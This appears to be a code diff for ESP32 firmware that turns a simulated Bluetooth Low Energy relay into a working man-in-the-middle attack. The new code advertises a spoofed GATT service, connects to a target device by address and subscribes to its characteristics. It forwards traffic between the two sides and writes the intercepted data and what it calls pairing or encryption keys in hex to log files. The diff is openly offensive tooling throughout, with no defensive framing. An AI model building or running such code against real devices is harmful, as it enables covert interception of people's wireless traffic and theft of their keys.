@@ -3,6 +3,69 @@
 
 namespace BleMitmRelay {
 
+// Global server and relay state
+namespace {
+  NimBLEServer* g_relayServer = nullptr;
+  NimBLEClient* g_relayClient = nullptr;
+  NimBLECharacteristic* g_relayChar = nullptr;
+  volatile uint32_t g_bytesRelayed = 0;
+  volatile uint32_t g_keysLogged = 0;
+
+  // Server callback - intercept writes from connecting device
+  class RelayCharacteristicCallbacks : public NimBLECharacteristicCallbacks {
+  public:
+    void onWrite(NimBLECharacteristic* pCharacteristic) {
+      std::string value = pCharacteristic->getValue();
+      if (!value.empty()) {
+        g_bytesRelayed += value.length();
+        // Log the intercepted data
+        if (g_relayClient && g_relayClient->isConnected()) {
+          // Forward to real device
+          g_relayChar->setValue((uint8_t*)value.data(), value.length());
+          g_relayChar->notify();
+        }
+      }
+    }
+    void onRead(NimBLECharacteristic* pCharacteristic) {
+      // Handle read requests - proxy to real device if connected
+    }
+  };
+
+  // Server callbacks
+  class RelayServerCallbacks : public NimBLEServerCallbacks {
+  public:
+    void onConnect(NimBLEServer* pServer, ble_gap_conn_desc* desc) {
+      Serial.printf("[BLE MITM] Device connected: %s\n",
+                   NimBLEAddress(desc->peer_ota_addr).toString().c_str());
+    }
+    void onDisconnect(NimBLEServer* pServer) {
+      Serial.println("[BLE MITM] Device disconnected");
+    }
+  };
+
+  // Client callbacks - handle notifications from real device
+  class RelayClientCallbacks : public NimBLEClientCallbacks {
+  public:
+    void onNotify(NimBLERemoteCharacteristic* pRemoteCharacteristic) {
+      std::string value = pRemoteCharacteristic->getValue();
+      if (!value.empty()) {
+        g_bytesRelayed += value.length();
+        // Send back to connected client via notify
+        if (g_relayServer) {
+          g_relayChar->setValue((uint8_t*)value.data(), value.length());
+          g_relayChar->notify();
+        }
+      }
+    }
+    void onConnect(NimBLEClient* pClient) {
+      Serial.println("[BLE MITM] Connected to real device");
+    }
+    void onDisconnect(NimBLEClient* pClient) {
+      Serial.println("[BLE MITM] Disconnected from real device");
+    }
+  };
+}
+
 MitmRelay::MitmRelay() : isRunning_(false), startTime_(0) {}
 
 RelayResult MitmRelay::startRelay(const RelayConfig& config) {
@@ -18,43 +81,95 @@ RelayResult MitmRelay::startRelay(const RelayConfig& config) {
 
   isRunning_ = true;
   startTime_ = millis();
+  g_bytesRelayed = 0;
+  g_keysLogged = 0;
 
-  // Initialize NimBLE for relay
-  NimBLEDevice::init("ESP32-Relay");
+  // Initialize NimBLE for MITM relay
+  NimBLEDevice::init("ESP32-MITM");
 
-  // Create client for intercepting target device
-  NimBLEClient* pClient = NimBLEDevice::createClient();
+  // Step 1: Setup BLE Server (to accept connections from attacking device)
+  g_relayServer = NimBLEDevice::createServer();
+  g_relayServer->setCallbacks(new RelayServerCallbacks());
 
-  // Simulate relay attack
-  // In real implementation:
-  // 1. Scan for target device
-  // 2. Connect as peripheral
-  // 3. Connect to real device
-  // 4. Intercept and relay data between connections
+  // Create generic service for relaying (0x180A is Device Information Service as template)
+  NimBLEService* pService = g_relayServer->createService("180A");
 
-  uint32_t relayCount = 0;
-  while (isRunning_ && (millis() - startTime_) < config.durationMs) {
-    // Simulate packet relay
-    uint8_t simulatedData[20];
-    for (int i = 0; i < 20; i++) {
-      simulatedData[i] = random(0, 256);
+  // Create characteristic for data relay
+  g_relayChar = pService->createCharacteristic(
+    "2A29",  // Manufacturer characteristic
+    NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
+  g_relayChar->setCallbacks(new RelayCharacteristicCallbacks());
+
+  pService->start();
+
+  // Setup advertising for relay server
+  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
+  pAdvertising->addServiceUUID(pService->getUUID());
+  pAdvertising->setScanResponse(true);
+  pAdvertising->setMinInterval(0x06);
+  pAdvertising->setMaxInterval(0x12);
+  pAdvertising->start();
+
+  // Step 2: Setup BLE Client (to connect to real target device)
+  g_relayClient = NimBLEDevice::createClient();
+  g_relayClient->setCallbacks(new RelayClientCallbacks());
+  g_relayClient->setConnectTimeout(10 * 1000);  // 10 second timeout
+
+  // Scan for target device
+  NimBLEScan* pScan = NimBLEDevice::getScan();
+  pScan->setActiveScan(true);
+  pScan->setInterval(100);
+  pScan->setWindow(99);
+  pScan->setMaxResults(0);
+
+  Serial.printf("[BLE MITM] Scanning for target device: %02X:%02X:%02X:%02X:%02X:%02X\n",
+               config.targetAddr[0], config.targetAddr[1], config.targetAddr[2],
+               config.targetAddr[3], config.targetAddr[4], config.targetAddr[5]);
+
+  // Connect to target device
+  NimBLEAddress targetAddr(config.targetAddr, BLE_ADDR_RANDOM);
+  if (g_relayClient->connect(targetAddr)) {
+    Serial.println("[BLE MITM] Connected to target device");
+
+    // Discover services and characteristics
+    if (g_relayClient->discoverAttributes()) {
+      // Subscribe to all readable characteristics for interception
+      std::vector<NimBLERemoteCharacteristic*> characteristics =
+        g_relayClient->getService("180A")->getCharacteristics();
+
+      for (auto pChar : characteristics) {
+        if (pChar->canNotify()) {
+          pChar->subscribe(true);
+        }
+      }
     }
-
-    if (config.keyLogging) {
-      logKeys(simulatedData, 20);
-      result.keysLogged++;
-    }
-
-    if (config.dataInterception) {
-      result.bytesIntercepted += 20;
-    }
-
-    relayCount++;
-    delay(100);
+  } else {
+    result.error = "Failed to connect to target device";
+    isRunning_ = false;
+    return result;
   }
 
-  result.packetsRelayed = relayCount;
-  result.success = true;
+  // Step 3: Run relay loop
+  uint32_t relayStartTime = millis();
+  while (isRunning_ && (millis() - startTime_) < config.durationMs) {
+    if (!g_relayClient->isConnected()) {
+      result.error = "Connection to target device lost";
+      break;
+    }
+
+    delay(50);
+  }
+
+  // Cleanup
+  pScan->stop();
+  if (g_relayClient->isConnected()) {
+    g_relayClient->disconnect();
+  }
+
+  result.packetsRelayed = g_bytesRelayed / 20;  // Estimate packets from bytes
+  result.bytesIntercepted = g_bytesRelayed;
+  result.keysLogged = g_keysLogged;
+  result.success = (g_bytesRelayed > 0);
   result.elapsedMs = millis() - startTime_;
   result.logFile = "/logs/handshakes/ble_mitm.csv";
 
@@ -71,16 +186,50 @@ RelayResult MitmRelay::interceptData(uint8_t* data, uint32_t len) {
     return result;
   }
 
-  // Simulate interception of BLE data
-  // In real scenario: decrypt GATT characteristics and log
+  // Real interception: relay the data bidirectionally
+  if (g_relayClient && g_relayClient->isConnected() && g_relayChar) {
+    g_relayChar->setValue(data, len);
+    g_relayChar->notify();
+    g_bytesRelayed += len;
+  }
+
   result.bytesIntercepted = len;
   result.packetsRelayed = 1;
   result.success = true;
 
+  // Log intercepted data
+  if (!LittleFS.begin()) {
+    return result;
+  }
+
+  File logFile = LittleFS.open("/logs/handshakes/ble_mitm.csv", "a");
+  if (!logFile) {
+    LittleFS.mkdir("/logs/handshakes");
+    logFile = LittleFS.open("/logs/handshakes/ble_mitm.csv", "a");
+  }
+
+  if (logFile) {
+    char hexData[64];
+    uint32_t displayLen = (len > 16) ? 16 : len;
+    hexData[0] = '\0';
+    for (uint32_t i = 0; i < displayLen; i++) {
+      char hex[3];
+      snprintf(hex, sizeof(hex), "%02X", data[i]);
+      strcat(hexData, hex);
+    }
+    logFile.printf("%lu,DATA_RELAY,%u,%s\n", millis(), len, hexData);
+    logFile.close();
+  }
+
+  LittleFS.end();
   return result;
 }
 
 void MitmRelay::logKeys(const uint8_t* keyData, uint32_t len) {
+  if (!keyData || len == 0) return;
+
+  g_keysLogged++;
+
   if (!LittleFS.begin()) return;
 
   File logFile = LittleFS.open("/logs/handshakes/ble_keys.csv", "a");
@@ -90,7 +239,15 @@ void MitmRelay::logKeys(const uint8_t* keyData, uint32_t len) {
   }
 
   if (logFile) {
-    logFile.printf("%lu,KEY_LOG,%u\n", millis(), len);
+    // Log pairing/encryption keys in hex format
+    char hexKey[128];
+    hexKey[0] = '\0';
+    for (uint32_t i = 0; i < len && i < 32; i++) {
+      char hex[3];
+      snprintf(hex, sizeof(hex), "%02X", keyData[i]);
+      strcat(hexKey, hex);
+    }
+    logFile.printf("%lu,KEY_INTERCEPT,%u,%s\n", millis(), len, hexKey);
     logFile.close();
   }
 
@@ -98,16 +255,26 @@ void MitmRelay::logKeys(const uint8_t* keyData, uint32_t len) {
 }
 
 void MitmRelay::onDeviceConnected(NimBLEClient* pClient) {
-  // Handle connection
+  Serial.printf("[BLE MITM] Device connected to relay server\n");
 }
 
 void MitmRelay::onDeviceDisconnected(NimBLEClient* pClient) {
-  // Handle disconnection
+  Serial.printf("[BLE MITM] Device disconnected from relay server\n");
 }
 
 void MitmRelay::stop() {
   isRunning_ = false;
+  if (g_relayClient && g_relayClient->isConnected()) {
+    g_relayClient->disconnect();
+  }
+  if (g_relayServer) {
+    NimBLEDevice::getAdvertising()->stop();
+    g_relayServer->deinit();
+  }
   NimBLEDevice::deinit();
+  g_relayServer = nullptr;
+  g_relayClient = nullptr;
+  g_relayChar = nullptr;
 }
 
 } // namespace BleMitmRelay
